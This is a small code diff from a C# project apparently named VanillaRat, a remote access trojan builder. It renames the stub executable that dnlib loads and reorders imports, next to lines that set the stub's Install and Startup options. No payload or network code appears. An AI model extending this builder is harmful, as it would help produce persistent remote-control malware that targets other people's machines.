@@ -1,7 +1,7 @@
-﻿using System;
+﻿using dnlib.DotNet;
+using System;
 using System.IO;
 using System.Linq;
-using dnlib.DotNet;
 using VanillaRatStub;
 
 namespace VanillaRat.Classes
@@ -19,7 +19,7 @@ namespace VanillaRat.Classes
             ClientSettings.Install = Install == "True" ? "True" : "False";
             ClientSettings.Startup = Startup == "True" ? "True" : "False";
             string FullName = "VanillaRatStub.ClientSettings";
-            var Assembly = AssemblyDef.Load("VanillaRatStub.exe");
+            var Assembly = AssemblyDef.Load("VanillaStub.exe");
             var Module = Assembly.ManifestModule;
             if (Module != null)
             {
